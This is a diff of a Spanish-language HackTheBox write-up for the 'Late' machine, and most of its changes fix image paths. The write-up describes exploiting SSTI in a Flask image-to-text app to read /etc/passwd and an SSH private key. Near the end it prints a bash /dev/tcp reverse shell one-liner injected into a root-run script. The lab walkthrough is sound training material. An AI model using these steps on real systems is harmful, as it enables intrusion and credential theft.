@@ -20,8 +20,7 @@ En esta ocasión vamos a resolver la máquina Late de la plataforma HackTheBox d
 
 `` nmap -p- -n -Pn --min-rate 5000 ip -sCV ``
 
-![](/assets/images/HTB/Late-Hackthebox/nmap.png)
-
+![](/assets/images/HTB/Late-HackTheBox/nmap.png)
 
 Tenemos el puerto 22 y el puerto 80 abiertos.
 
@@ -29,18 +28,17 @@ Procedo a ojear el puerto 80.
 
 # Reconocimiento Web
 
-![](/assets/images/HTB/Late-Hackthebox/web1.png)
-
+![](/assets/images/HTB/Late-HackTheBox/web1.png)
 
 A primera vista no hay nada relevante, pero al mirar el código fuente de la página encuentro lo siguiente:
 
-![](/assets/images/HTB/Late-Hackthebox/web2.png)
+![](/assets/images/HTB/Late-HackTheBox/web2.png)
 
 Encuentro un vhost que añado al archivo hosts de mi máquina.
 
 Accedo al vhost desde el navegador y encuentro la siguiente página web.
 
-![](/assets/images/HTB/Late-Hackthebox/web3.png)
+![](/assets/images/HTB/Late-HackTheBox/web3.png)
 
 A primera vista estamos ante una web que nos ofrece la posibilidad de convertir imágenes a documentos de texto, y que además usa la tecnología FLASK.
 
@@ -52,11 +50,11 @@ Flask es un framework minimalista escrito en Python que permite crear aplicacion
 
 Capturo una imágen con texto, como esta y la subo para convertirla:
 
-![](/assets/images/HTB/Late-Hackthebox/web4.png)
+![](/assets/images/HTB/Late-HackTheBox/web4.png)
 
 Una vez convertida se nos descargará un archivo bajo el nombre de results.txt con el siguiente contenido:
 
-![](/assets/images/HTB/Late-Hackthebox/web5.png)
+![](/assets/images/HTB/Late-HackTheBox/web5.png)
 
 
 Como era obvio, nos convierte el texto de imágen en un documento de texto.
@@ -77,8 +75,7 @@ Ya que si nos fijamos en la definición de qué es Flask encontramos que está b
 
 Asique procedo a buscar más información acerca de como detectar este tipo de vulnerabilidad y encuentro lo siguiente:
 
-
-![](/assets/images/HTB/Late-Hackthebox/ssti.png)
+![](/assets/images/HTB/Late-HackTheBox/ssti.png)
 
 Si nos copiamos uno de estos templates, y le hacemos captura y lo subimos la página web podremos comprobar si es vulnerable a SSTI.
 
@@ -88,7 +85,7 @@ Uso el siguiente template:
 
 Una vez lo hemos capturado lo subimos y leemos la respuesta
 
-![](/assets/images/HTB/Late-Hackthebox/ssti2.png)
+![](/assets/images/HTB/Late-HackTheBox/ssti2.png)
 
 Como vemos es vulnerable a SSTI, ya que nos devuelve el resultado de la operación 7*7=49
 
@@ -96,7 +93,7 @@ Sigo los pasos de la web de referencia para continuar después de haber detectad
 
 Encuentro lo siguiente:
 
-![](/assets/images/HTB/Late-Hackthebox/ssti3.png)
+![](/assets/images/HTB/Late-HackTheBox/ssti3.png)
 
 Con uno de estos templates podemos leer archivos remotos del servidor.
 
@@ -104,11 +101,11 @@ El procedimiento es el mismo, copiar el template, capturarlo y subirlo a la web 
 
 En mi caso probé algunos templates sin éxito hasta que di con el correcto:
 
-![](/assets/images/HTB/Late-Hackthebox/ssti4.png)
+![](/assets/images/HTB/Late-HackTheBox/ssti4.png)
 
 Con este template leemos el archivo passwd
 
-![](/assets/images/HTB/Late-Hackthebox/passwd.png)
+![](/assets/images/HTB/Late-HackTheBox/passwd.png)
 
 Filtro por tipo de shell, en este caso bash
 
@@ -118,15 +115,15 @@ A continuación intenté leer el archivo shadow por si por algún casual tuviera
 
 Se me ocurrió intentar leer el id_rsa del usuario svc_acc para conectarme mediante ssh (puerto 22), editando el template usado anteriormente.
 
-![](/assets/images/HTB/Late-Hackthebox/ssti5.png)
+![](/assets/images/HTB/Late-HackTheBox/ssti5.png)
 
 Repetimos el procedimiento y leemos el archivo results.txt.
 
-![](/assets/images/HTB/Late-Hackthebox/rsa.png)
+![](/assets/images/HTB/Late-HackTheBox/rsa.png)
 
 Y ya tenemos el id_rsa, ahora le asignamos los permisos necesarios y nos logueamos por ssh usando la clave rsa.
 
-![](/assets/images/HTB/Late-Hackthebox/sshrsa.png)
+![](/assets/images/HTB/Late-HackTheBox/sshrsa.png)
 
 Listo, tengo acceso al servidor como el usuario svc_acc y ya podemos leer la flag user.txt.
 
@@ -136,11 +133,11 @@ A continuación toca escalar privilegios, y si nos fijamos tenemos las herramien
 
 Primero lanzo pspy64 para buscar procesos ocultos en ejecución y encuentro algo extraño.
 
-![](/assets/images/HTB/Late-Hackthebox/pspy64.png)
+![](/assets/images/HTB/Late-HackTheBox/pspy64.png)
 
 Tenemos un script en bash bajo el nombre de ssh-alert.sh, leo el código y encuentro esto:
 
-![](/assets/images/HTB/Late-Hackthebox/ssh-alert.png)
+![](/assets/images/HTB/Late-HackTheBox/ssh-alert.png)
 
 Es un script en bash que se ejecuta cuando nos logueamos por ssh.
 
@@ -152,9 +149,9 @@ echo "bash -i >& /dev/tcp/IP/PORT 0>&1" > reverse.txt
 cat ssh-alert.sh
 ```
 
-![](/assets/images/HTB/Late-Hackthebox/rev-shell.png)
+![](/assets/images/HTB/Late-HackTheBox/rev-shell.png)
 
 Ahora nos ponemos en escucha desde el puerto que hayamos puesto en la reverse shell y nos conectamos por ssh como anteriormente.
 
-![](/assets/images/HTB/Late-Hackthebox/root.png)
+![](/assets/images/HTB/Late-HackTheBox/root.png)
 
